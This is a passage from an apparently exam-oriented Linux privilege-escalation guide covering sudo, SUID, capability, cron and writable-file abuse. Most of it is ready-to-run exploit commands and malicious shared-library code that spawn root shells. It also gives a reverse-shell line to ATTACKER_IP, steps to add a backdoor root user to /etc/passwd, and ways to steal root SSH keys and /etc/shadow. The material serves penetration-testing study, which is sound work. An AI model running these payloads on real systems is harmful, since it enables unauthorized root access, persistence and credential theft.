# Output: (root) NOPASSWD: /usr/bin/find

# Exploit
sudo find /etc -name nothing -exec /bin/bash \;

# Alternative
sudo find /etc -name nothing -exec /bin/sh \;

# Using /bin/bash directly
sudo find . -exec /bin/bash -p \; -quit
```

#### Example 3: less/more

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/less

# Exploit
sudo less /etc/hosts
# Inside less, press:
!bash

# Alternative - One liner
echo '!bash' | sudo less /etc/hosts
```

#### Example 4: nmap (older versions only)

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/nmap

# Check nmap version
nmap --version
# If version < 5.21, has interactive mode

# Exploit (nmap < 5.21)
sudo nmap --interactive
# Inside nmap:
!sh

# If nmap >= 5.21 (no interactive mode), use scripts
echo 'os.execute("/bin/bash")' > shell.nse
sudo nmap --script=shell.nse
```

#### Example 5: awk

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/awk

# Exploit
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### Example 6: perl

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/perl

# Exploit
sudo perl -e 'exec "/bin/bash";'
```

#### Example 7: python

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/python

# Exploit
sudo python -c 'import os; os.system("/bin/bash")'

# Alternative
sudo python
>>> import os
>>> os.system("/bin/bash")
```

#### Example 8: tar

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/tar

# Exploit
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

#### Example 9: git

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/git

# Exploit
sudo git -p help
# Inside help (less pager):
!bash

# Alternative
sudo git branch --help
!bash
```

#### Example 10: man

```bash
# Check permissions
sudo -l
# Output: (root) NOPASSWD: /usr/bin/man

# Exploit
sudo man man
# Inside man page:
!bash
```

### 5.5 Sudo Environment Variables

#### LD_PRELOAD Exploitation

If `env_keep+=LD_PRELOAD` is set in sudoers, you can load a malicious shared library.

**Check**:
```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

**Exploit**:

1. Create malicious library:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. Run with sudo:

```bash
# Assuming you can run any command with sudo
sudo LD_PRELOAD=./shell.so find
# Or any command you can sudo

# Root shell spawns!
```

**Complete Example**:

```bash
# 1. Check sudo permissions
sudo -l
# Output shows: env_keep+=LD_PRELOAD

# 2. Create malicious library
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# 3. Compile
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# 4. Exploit (using any sudo-allowed program)
sudo LD_PRELOAD=/tmp/shell.so find

# 5. Root shell!
id
# uid=0(root) gid=0(root)
```

#### LD_LIBRARY_PATH Exploitation

Similar to LD_PRELOAD, but hijacks library loading path.

**Check**:
```bash
sudo -l
# Look for: env_keep+=LD_LIBRARY_PATH
```

**Exploit**:

```bash
# 1. Find which libraries a sudo-allowed program uses
ldd /usr/bin/apache2
# Output shows: libcrypt.so.1 => /lib/libcrypt.so.1

# 2. Create malicious library with same name
cat > libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
EOF

# 3. Compile
gcc -shared -fPIC -o libcrypt.so.1 libcrypt.c

# 4. Exploit
sudo LD_LIBRARY_PATH=. apache2

# 5. Run SUID bash
/tmp/bash -p
# Root shell!
```

### 5.6 Sudo Version Vulnerabilities

Certain sudo versions have vulnerabilities themselves.

#### CVE-2019-14287 (Sudo < 1.8.28)

**Vulnerability**: Bypass of Runas user restrictions when `ALL` is specified with `!root`.

**Check sudo version**:
```bash
sudo --version
# Sudo version 1.8.21p2
```

**Check if vulnerable**:
```bash
sudo -l
# Output:
# User john may run the following commands on victim:
#     (ALL, !root) NOPASSWD: /bin/bash
```

**Exploit**:
```bash
# Normally this would fail:
sudo /bin/bash
# Sorry, user john is not allowed to execute '/bin/bash' as root

# But you can bypass by specifying UID -1
sudo -u#-1 /bin/bash
# Root shell!

id
# uid=0(root) gid=1000(john)
```

### 5.7 Wildcards in Sudo

If sudo allows wildcards, you might be able to exploit it.

**Example**:
```bash
sudo -l
# Output: (root) NOPASSWD: /usr/bin/python /opt/scripts/*.py
```

**Exploit**:
```bash
# Create malicious script in /opt/scripts/
cat > /opt/scripts/evil.py << 'EOF'
import os
os.system("/bin/bash")
EOF

# Run with sudo
sudo /usr/bin/python /opt/scripts/evil.py
# Root shell!
```

### 5.8 Sudo Exploitation Cheat Sheet

```bash
# vim/vi
sudo vim -c ':!/bin/bash'
sudo vi -c ':!/bin/bash' /dev/null

# nano
sudo nano
# Ctrl+R, Ctrl+X
# reset; bash 1>&0 2>&0

# less/more
sudo less /etc/hosts
!/bin/bash

# man
sudo man man
!/bin/bash

# find
sudo find /etc -name test -exec /bin/bash \;

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# perl
sudo perl -e 'exec "/bin/bash";'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# lua
sudo lua -e 'os.execute("/bin/bash")'

# php
sudo php -r "system('/bin/bash');"

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/test.zip /tmp/test -T -TT 'sh #'

# git
sudo git help config
!/bin/bash

# ftp
sudo ftp
!/bin/bash

# nmap (< 5.21)
sudo nmap --interactive
!sh

# tcpdump
echo '/bin/bash' > /tmp/shell
chmod +x /tmp/shell
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell
```

---

## 6. Pillar 3: SUID and SGID Binaries

### 6.1 Understanding SUID

**SUID** (Set User ID) is a special permission that allows a file to be executed with the permissions of the file **owner** rather than the user running it.

**Real-World Analogy**: Imagine a locked safe in an office. Normally, only the manager can open it. But the manager creates a special key machine (SUID binary) that anyone can use to open the safe. The machine acts as the manager, even though you're just a regular employee.

```
┌──────────────────────────────────────────────────────────┐
│                 SUID EXECUTION FLOW                      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Regular File (no SUID):                                 │
│  ┌─────────────────────────────────────┐                │
│  │ File: /usr/bin/cat                  │                │
│  │ Owner: root                         │                │
│  │ Permissions: -rwxr-xr-x (755)       │                │
│  └─────────────────────────────────────┘                │
│                ↓                                         │
│  User john (UID 1000) runs: /usr/bin/cat /etc/shadow    │
│                ↓                                         │
│  Executes as: UID 1000 (john)                            │
│                ↓                                         │
│  Result: Permission denied (can't read /etc/shadow)      │
│                                                          │
│  ─────────────────────────────────────                  │
│                                                          │
│  SUID File:                                              │
│  ┌─────────────────────────────────────┐                │
│  │ File: /usr/bin/passwd               │                │
│  │ Owner: root                         │                │
│  │ Permissions: -rwsr-xr-x (4755)      │                │
│  │               ↑ SUID bit set        │                │
│  └─────────────────────────────────────┘                │
│                ↓                                         │
│  User john (UID 1000) runs: /usr/bin/passwd              │
│                ↓                                         │
│  Executes as: UID 0 (root) ← SUID bit promotes user!    │
│                ↓                                         │
│  Result: Can modify /etc/shadow (running as root)        │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**Why SUID Exists**: Some programs NEED root privileges to function, even when run by regular users. Example: `passwd` needs to write to `/etc/shadow` to change passwords.

**The Security Risk**: If a SUID binary is poorly written or misconfigured, it can be exploited to run arbitrary commands as root.

### 6.2 Finding SUID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SUID binaries (alternative notation)
find / -perm -u=s -type f 2>/dev/null

# Find SUID binaries with detailed listing
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Find SUID owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Find SUID in specific directory
find /usr/bin -perm -4000 -type f 2>/dev/null

# Find SGID only
find / -perm -2000 -type f 2>/dev/null
```

**Understanding the Output**:
```bash
$ find / -perm -4000 -type f 2>/dev/null
-rwsr-xr-x 1 root root 40K /usr/bin/passwd
-rwsr-xr-x 1 root root 40K /usr/bin/chsh
-rwsr-xr-x 1 root root 44K /usr/bin/chfn
-rwsr-xr-x 1 root root 53K /usr/bin/gpasswd
-rwsr-xr-x 1 root root 23K /usr/bin/pkexec
-rwsr-xr-x 1 root root 51K /usr/bin/mount
-rwsr-xr-x 1 root root 34K /usr/bin/umount
-rwsr-xr-x 1 root root 40K /usr/bin/su
-rwsr-xr-x 1 root root 139K /usr/bin/sudo
-rwsr-xr-x 1 root root 10K /usr/local/bin/backup  ← CUSTOM! Investigate!
```

**Permission Breakdown**:
```
-rwsr-xr-x
│││││││││└─ Others: execute
││││││││└── Others: no write
│││││││└─── Others: read
││││││└──── Group: execute
│││││└───── Group: no write
││││└────── Group: read
│││└─────── SUID bit is SET (s instead of x)
││└──────── Owner: write
│└───────── Owner: read
└────────── Regular file
```

### 6.3 Standard vs Custom SUID Binaries

**Standard SUID Binaries** (expected, usually not exploitable):
- `/usr/bin/passwd` - Changes user password
- `/usr/bin/sudo` - Runs commands as root
- `/usr/bin/su` - Switches user
- `/usr/bin/mount` - Mounts filesystems
- `/usr/bin/umount` - Unmounts filesystems
- `/usr/bin/ping` - Sends ICMP packets (needs raw socket)
- `/usr/bin/pkexec` - PolicyKit execute
- `/bin/fusermount` - FUSE filesystem mounting

**Custom SUID Binaries** (INVESTIGATE IMMEDIATELY):
- Anything in `/usr/local/bin/`
- Anything in `/home/*/`
- Anything in `/opt/`
- Anything in `/tmp/` or `/var/tmp/`
- Anything with a non-standard name

### 6.4 SUID Exploitation Strategies

```
┌────────────────────────────────────────────────────────┐
│         SUID EXPLOITATION DECISION TREE                │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Found SUID Binary                                     │
│         ↓                                              │
│  Is it a known GTFOBins binary?                        │
│  ├─ YES → Use GTFOBins exploitation                    │
│  └─ NO  → Is it a custom binary?                       │
│      ├─ YES → Analyze with strings/ltrace/strace       │
│      │   ├─ Uses system() without full path?           │
│      │   │   └─ PATH hijacking                         │
│      │   ├─ Calls library without full path?           │
│      │   │   └─ Shared library injection               │
│      │   ├─ Has buffer overflow?                       │
│      │   │   └─ Binary exploitation (advanced)         │
│      │   └─ Uses environment variables?                │
│      │       └─ Environment manipulation                │
│      └─ NO → Check for known vulnerabilities/CVEs      │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### 6.5 Exploiting Known SUID Binaries (GTFOBins)

#### Example: nmap (versions < 5.21)

```bash
# Find SUID nmap
find / -name nmap -perm -4000 2>/dev/null

# Check version
nmap --version
# Nmap version 5.00 (has interactive mode)

# Exploit
nmap --interactive
nmap> !sh
# Root shell!
```

#### Example: vim

```bash
# If vim is SUID
find / -name vim -perm -4000 2>/dev/null

# Exploit
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Or simpler
vim
:set shell=/bin/sh
:shell
```

#### Example: bash

```bash
# Find SUID bash
find / -name bash -perm -4000 2>/dev/null

# Exploit (use -p to NOT drop privileges)
bash -p

# Verify
id
# uid=1000(john) gid=1000(john) euid=0(root)  ← effective UID is root!
```

#### Example: cp (copy)

```bash
# If cp is SUID
find / -name cp -perm -4000 2>/dev/null

# Exploit: Overwrite /etc/passwd
# Create malicious passwd
openssl passwd -1 -salt evil password123
# Output: $1$evil$IH4izTm9bAzkBOD2WRDlb1

# Create new passwd file with root user
cat > /tmp/passwd << 'EOF'
root:x:0:0:root:/root:/bin/bash
evil:$1$evil$IH4izTm9bAzkBOD2WRDlb1:0:0:pwned:/root:/bin/bash
EOF

# Backup original
cp /etc/passwd /tmp/passwd.bak

# Overwrite with malicious version
cp /tmp/passwd /etc/passwd

# Login as evil user
su evil
# Password: password123
# Root shell!
```

### 6.6 Exploiting Custom SUID Binaries

#### Step 1: Analyze the Binary

```bash
# Find custom SUID binary
find / -perm -4000 -type f 2>/dev/null | grep -v "^/usr/bin\|^/bin\|^/usr/sbin\|^/sbin"

# Example output
/usr/local/bin/backup

# Check what it is
file /usr/local/bin/backup
# Output: ELF 64-bit LSB executable

# Check strings (look for commands it might run)
strings /usr/local/bin/backup

# Trace library calls
ltrace /usr/local/bin/backup

# Trace system calls
strace /usr/local/bin/backup

# Run it to see what it does
/usr/local/bin/backup
```

#### Step 2: Identify Vulnerability

**Look for**:
1. System commands called without full path (e.g., `tar` instead of `/bin/tar`)
2. Use of user-controllable input
3. Environment variable usage
4. Library loading

**Example strings output**:
```bash
$ strings /usr/local/bin/backup
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__libc_start_main
tar -czf /tmp/backup.tar.gz /home/user/documents
```

**VULNERABILITY FOUND**: Binary calls `tar` without full path (`/bin/tar`)!

#### Step 3: PATH Hijacking Exploitation

```bash
# 1. Create malicious 'tar' in /tmp
cat > /tmp/tar << 'EOF'
#!/bin/bash
/bin/bash -p
EOF

# 2. Make executable
chmod +x /tmp/tar

# 3. Add /tmp to PATH (prepend to search /tmp first)
export PATH=/tmp:$PATH

# 4. Verify PATH
echo $PATH
# /tmp:/usr/local/bin:/usr/bin:/bin

# 5. Run SUID binary
/usr/local/bin/backup

# 6. Root shell spawns!
id
# uid=1000(john) gid=1000(john) euid=0(root)
```

**Full Example with Analysis**:

```bash
# Discovery
find / -perm -4000 -type f 2>/dev/null | grep "/usr/local"
# Found: /usr/local/bin/sys-check

# Investigation
file /usr/local/bin/sys-check
# ELF 64-bit LSB executable, x86-64

strings /usr/local/bin/sys-check
# System Diagnostic Tool
# Checking system status...
# curl http://monitoring.local/status
# Done.

# VULNERABILITY: Uses 'curl' without full path!

# Exploitation
echo '/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/local/bin/sys-check

# ROOT!
```

### 6.7 Real OSCP Example: SUID Binary Exploitation

**Scenario**: HackTheBox machine "Bashed"

```bash
# Enumeration
www-data@bashed:/$ find / -perm -4000 2>/dev/null
# ... standard binaries ...
/usr/bin/scriptmanager  ← INTERESTING!

# Investigation
www-data@bashed:/$ file /usr/bin/scriptmanager
ELF 64-bit LSB executable

www-data@bashed:/$ strings /usr/bin/scriptmanager
# ... output shows ...
/scripts/test.py
python %s

# VULNERABILITY: Calls 'python' without full path!

# Create malicious python
www-data@bashed:/$ cat > /tmp/python << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

www-data@bashed:/$ chmod +x /tmp/python
www-data@bashed:/$ export PATH=/tmp:$PATH

# Run SUID binary
www-data@bashed:/$ /usr/bin/scriptmanager

# SUID bash created!
www-data@bashed:/$ /tmp/rootbash -p
root@bashed:/# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

### 6.8 SGID Exploitation

**SGID** (Set Group ID) is like SUID but for groups.

```bash
# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find writable SGID files
find / -perm -2000 -type f -writable 2>/dev/null
```

**Example**: SGID binary in `disk` group can read any disk (including `/dev/sda1` with root filesystem).

```bash
# If you find SGID binary in 'disk' group
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
# Private key displayed!
```

---

## 7. Pillar 4: Linux Capabilities

### 7.1 What are Linux Capabilities?

Modern Linux privilege system that's more granular than SUID.

**Old Way (SUID)**: Binary either runs as root (ALL privileges) or as user (NO privileges)

**New Way (Capabilities)**: Grant specific root privileges without granting ALL root privileges

**Analogy**: Instead of giving someone a master key to the entire building (SUID), you give them keys to specific rooms they need (capabilities).

```
┌────────────────────────────────────────────────────────────┐
│              CAPABILITIES vs SUID                          │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  SUID Binary (All or Nothing):                            │
│  ┌──────────────────────────────────────┐                │
│  │  /usr/bin/passwd (SUID root)         │                │
│  │  Gets ALL root privileges            │                │
│  │  - Read any file                     │                │
│  │  - Write any file                    │                │
│  │  - Kill any process                  │                │
│  │  - Change UID                        │                │
│  │  - Load kernel modules               │                │
│  │  - Everything else root can do       │                │
│  └──────────────────────────────────────┘                │
│                                                            │
│  Capability-Based (Granular):                             │
│  ┌──────────────────────────────────────┐                │
│  │  /usr/bin/passwd (cap_dac_override)  │                │
│  │  Gets ONLY:                          │                │
│  │  - Bypass file permission checks     │                │
│  │                                      │                │
│  │  Does NOT get:                       │                │
│  │  - Ability to change UID             │                │
│  │  - Ability to load kernel modules    │                │
│  │  - Other root privileges             │                │
│  └──────────────────────────────────────┘                │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 7.2 Important Capabilities

```
CAP_CHOWN               Change file ownership
CAP_DAC_OVERRIDE        Bypass file read/write/execute checks
CAP_DAC_READ_SEARCH     Bypass file/directory read checks
CAP_FOWNER              Bypass permission checks on operations that require file ownership
CAP_SETUID              Make arbitrary manipulations of process UIDs (DANGEROUS!)
CAP_SETGID              Make arbitrary manipulations of process GIDs
CAP_SYS_ADMIN           Mount filesystems, load kernel modules (VERY DANGEROUS!)
CAP_SYS_PTRACE          Trace arbitrary processes using ptrace()
CAP_SYS_MODULE          Load and unload kernel modules
CAP_NET_RAW             Use RAW and PACKET sockets
CAP_NET_BIND_SERVICE    Bind to ports below 1024
```

**Most Dangerous for PrivEsc**:
1. `CAP_SETUID` - Can become root
2. `CAP_SYS_ADMIN` - Can mount filesystems, escape containers
3. `CAP_DAC_OVERRIDE` - Can read/write any file
4. `CAP_DAC_READ_SEARCH` - Can read any file

### 7.3 Finding Capabilities

```bash
# List all files with capabilities
getcap -r / 2>/dev/null

# Check specific file
getcap /usr/bin/python3.8

# List capabilities in specific directory
getcap -r /usr/bin 2>/dev/null
```

**Example Output**:
```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

**Understanding the notation**:
- `cap_setuid+ep`
  - `cap_setuid` = Capability name
  - `e` = **E**ffective (capability is active)
  - `p` = **P**ermitted (capability is allowed)
  - `i` = **I**nherited (capability is inherited by child processes)

### 7.4 Exploiting CAP_SETUID

**CAP_SETUID** allows changing UID to 0 (root).

**Example: Python with CAP_SETUID**

```bash
# Find python with cap_setuid
getcap -r / 2>/dev/null | grep "cap_setuid"
# Output: /usr/bin/python3.8 = cap_setuid+ep

# Exploit
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Root shell!
id
# uid=0(root) gid=1000(john)
```

**Example: Perl with CAP_SETUID**

```bash
# Find perl with cap_setuid
getcap -r / 2>/dev/null | grep perl

# Exploit
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Example: Any Binary with CAP_SETUID**

General template for creating exploit:

```c
// setuid_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

### 7.5 Exploiting CAP_DAC_OVERRIDE

**CAP_DAC_OVERRIDE** bypasses read/write/execute permission checks.

```bash
# Find binaries with cap_dac_override
getcap -r / 2>/dev/null | grep "cap_dac_override"

# If tar has cap_dac_override
# Can read any file!
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz -C /tmp
cat /tmp/etc/shadow

# Can write any file!
# Add root user to /etc/passwd
echo 'evil:$1$evil$IH4izTm9bAzkBOD2WRDlb1:0:0:pwned:/root:/bin/bash' >> /etc/passwd
su evil
```

### 7.6 Exploiting CAP_DAC_READ_SEARCH

**CAP_DAC_READ_SEARCH** bypasses file/directory read permission checks.

```bash
# If tar has cap_dac_read_search
# Read any file
tar -czf /tmp/root.tar.gz /root
tar -xzf /tmp/root.tar.gz -C /tmp
ls -la /tmp/root
cat /tmp/root/.ssh/id_rsa

# Read /etc/shadow
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz -C /tmp
cat /tmp/etc/shadow
# Crack root password with john
```

### 7.7 Exploiting CAP_SYS_ADMIN

**CAP_SYS_ADMIN** is extremely powerful - can mount filesystems.

```bash
# If python has cap_sys_admin
# Mount host filesystem (in container escape scenarios)
python3 -c '
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.mount.argtypes = (ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_char_p)
libc.mount(b"/dev/sda1", b"/mnt", b"ext4", 0, b"")
'

# Access host filesystem
ls /mnt
cat /mnt/etc/shadow
```

### 7.8 Setting Capabilities (For Testing)

```bash
# Set capability on binary (requires root to set)
sudo setcap cap_setuid+ep /usr/bin/python3.8

# Remove capability
sudo setcap -r /usr/bin/python3.8

# View capabilities
getcap /usr/bin/python3.8
```

---

## 8. Pillar 5: Cron Job Exploitation

### 8.1 Understanding Cron

**Cron** is Linux's task scheduler. It runs commands/scripts at scheduled times.

**Analogy**: Cron is like an automated butler that performs tasks at specific times. If the butler's instructions (scripts) can be modified by you, you can make him do whatever you want - including giving you the keys to the mansion (root access).

```
┌────────────────────────────────────────────────────────────┐
│                   CRON EXPLOITATION                        │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Root's Cron Job:                                          │
│  ┌──────────────────────────────────────┐                │
│  │ */5 * * * * /usr/local/bin/backup.sh │                │
│  │ (Runs every 5 minutes as root)       │                │
│  └──────────────────────────────────────┘                │
│                ↓                                           │
│  Script /usr/local/bin/backup.sh                           │
│  ┌──────────────────────────────────────┐                │
│  │ #!/bin/bash                          │                │
│  │ tar -czf /backups/data.tar.gz /data  │                │
│  └──────────────────────────────────────┘                │
│                ↓                                           │
│  If YOU can write to backup.sh:                            │
│  ┌──────────────────────────────────────┐                │
│  │ #!/bin/bash                          │                │
│  │ cp /bin/bash /tmp/rootbash           │                │
│  │ chmod +s /tmp/rootbash               │                │
│  └──────────────────────────────────────┘                │
│                ↓                                           │
│  Wait 5 minutes...                                         │
│                ↓                                           │
│  /tmp/rootbash -p                                          │
│                ↓                                           │
│  ROOT SHELL!                                               │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 8.2 Finding Cron Jobs

```bash
# System-wide cron jobs
cat /etc/crontab

# User cron jobs
crontab -l
crontab -l -u username

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# User crontabs
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# Systemd timers (modern alternative to cron)
systemctl list-timers --all
```

**Example /etc/crontab**:
```
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /usr/local/bin/backup.sh
```

**Cron Syntax**:
```
* * * * * command
│ │ │ │ │
│ │ │ │ └─── Day of week (0-7, Sun=0 or 7)
│ │ │ └───── Month (1-12)
│ │ └─────── Day of month (1-31)
│ └───────── Hour (0-23)
└─────────── Minute (0-59)

Examples:
0 0 * * *    → Every day at midnight
*/5 * * * *  → Every 5 minutes
0 9-17 * * * → Every hour from 9am to 5pm
```

### 8.3 Using pspy to Find Hidden Cron Jobs

Sometimes cron jobs don't appear in `/etc/crontab` but still run. Use **pspy** to watch processes.

```bash
# Download pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

# Run
chmod +x pspy64
./pspy64

# Wait and watch output for processes spawned by cron
# Look for:
# - UID=0 (root processes)
# - Scripts in writable locations
# - Scripts with writable parent directories
```

**Example pspy output**:
```
2024/01/24 10:05:01 CMD: UID=0    PID=12345  | /bin/bash /usr/local/bin/cleanup.sh
```

### 8.4 Exploitation Method 1: Writable Script

**Scenario**: Cron runs a script you can write to.

```bash
# 1. Find cron job
cat /etc/crontab
# */5 * * * * root /usr/local/bin/backup.sh

# 2. Check permissions
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 234 Jan 24 10:00 /usr/local/bin/backup.sh
# World-writable!

# 3. Check current content
cat /usr/local/bin/backup.sh

# 4. Append malicious code
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh

# 5. Wait for cron to execute (check every minute)
watch -n 1 ls -la /tmp/rootbash

# 6. Once created, execute
/tmp/rootbash -p

# 7. Root shell!
id
# uid=1000(john) euid=0(root)
```

**Alternative Payloads**:

```bash
# Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /script.sh

# Add root user
echo 'echo "evil:$(openssl passwd -1 -salt evil password123):0:0:root:/root:/bin/bash" >> /etc/passwd' >> /script.sh

# Copy root SSH key
echo 'cp /root/.ssh/id_rsa /tmp/root_key; chmod 644 /tmp/root_key' >> /script.sh

# Add SSH key to root
echo 'echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys' >> /script.sh
```

### 8.5 Exploitation Method 2: Writable Directory with PATH

**Scenario**: Cron script calls command without full path, and you can write to a directory in PATH.

```bash
# 1. Find cron job
cat /etc/crontab
# */5 * * * * root /usr/local/bin/monitor.sh

# 2. Examine script
cat /usr/local/bin/monitor.sh
#!/bin/bash
# System monitoring script
uptime > /var/log/uptime.log
df -h > /var/log/disk.log
curl http://monitoring.local/status  # ← No full path!

# 3. Check PATH in cron
# /etc/crontab shows: PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# 4. Find writable directory in PATH
ls -la /usr/local/sbin
# drwxrwxrwx 2 root root 4096 Jan 24 10:00 /usr/local/sbin
# World-writable!

# 5. Create malicious curl
cat > /usr/local/sbin/curl << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /usr/local/sbin/curl

# 6. Wait for cron
watch -n 1 ls -la /tmp/rootbash

# 7. Execute
/tmp/rootbash -p
```

### 8.6 Exploitation Method 3: Wildcard Injection

**Scenario**: Cron job uses wildcards in commands (especially `tar`).

```bash
# 1. Find cron job
cat /etc/crontab
# */5 * * * * root cd /home/user && tar -czf /backups/backup.tar.gz *

# 2. Understanding the vulnerability
# When tar processes *, it treats filenames as arguments
# We can create files that look like command-line arguments!

# 3. Exploit with checkpoint options
cd /home/user

# Create malicious script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create checkpoint files (these become tar arguments!)
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# 4. How it works:
# tar -czf /backups/backup.tar.gz *
# Expands to:
# tar -czf /backups/backup.tar.gz file1 file2 --checkpoint=1 --checkpoint-action=exec=sh shell.sh
#
# tar sees --checkpoint options and executes shell.sh!

# 5. Wait for cron
watch -n 1 ls -la /tmp/rootbash

# 6. Execute
/tmp/rootbash -p
```

**Wildcard Injection for Other Commands**:

```bash
# rsync
touch -- "-e sh shell.sh"

# chown
touch -- "--reference=/root/file"

# chmod
touch -- "--reference=/root/file"
```

### 8.7 Exploitation Method 4: Cron + PATH Hijacking

**Scenario**: Cron has custom PATH that includes writable directory.

```bash
# 1. Check /etc/crontab
cat /etc/crontab
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/local/bin/system-check.sh

# 2. /home/user is in PATH and we can write there!

# 3. Check what commands the script uses
cat /usr/local/bin/system-check.sh
#!/bin/bash
uptime
df -h
ps aux

# 4. Create malicious uptime in /home/user
cat > /home/user/uptime << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /home/user/uptime

# 5. Wait and execute
watch -n 1 ls -la /tmp/rootbash
/tmp/rootbash -p
```

### 8.8 Cron Enumeration Checklist

```bash
# Check all cron sources
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/*
crontab -l
sudo crontab -l

# Check for writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null

# Check for writable script directories
find /etc/cron* -type d -writable 2>/dev/null

# Monitor with pspy
./pspy64 -pf

# Check systemd timers (modern cron)
systemctl list-timers --all

# Look at timer units
find /etc/systemd/system -name "*.timer"
cat /etc/systemd/system/*.timer
```

---

## 9. Pillar 6: Writable Files and Directories

### 9.1 Critical System Files

Certain files, if writable, lead to immediate root access.

```bash
# Find world-writable files
find / -perm -0002 -type f 2>/dev/null

# Find files you can write to in /etc
find /etc -writable -type f 2>/dev/null
```

### 9.2 Exploiting Writable /etc/passwd

If `/etc/passwd` is writable, add a root user.

```bash
# 1. Check if writable
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1234 Jan 24 10:00 /etc/passwd

# 2. Generate password hash
openssl passwd -1 -salt evil password123
# Output: $1$evil$IH4izTm9bAzkBOD2WRDlb1

# 3. Add new root user
echo 'evil:$1$evil$IH4izTm9bAzkBOD2WRDlb1:0:0:pwned:/root:/bin/bash' >> /etc/passwd

# 4. Switch to new user
su evil
# Password: password123

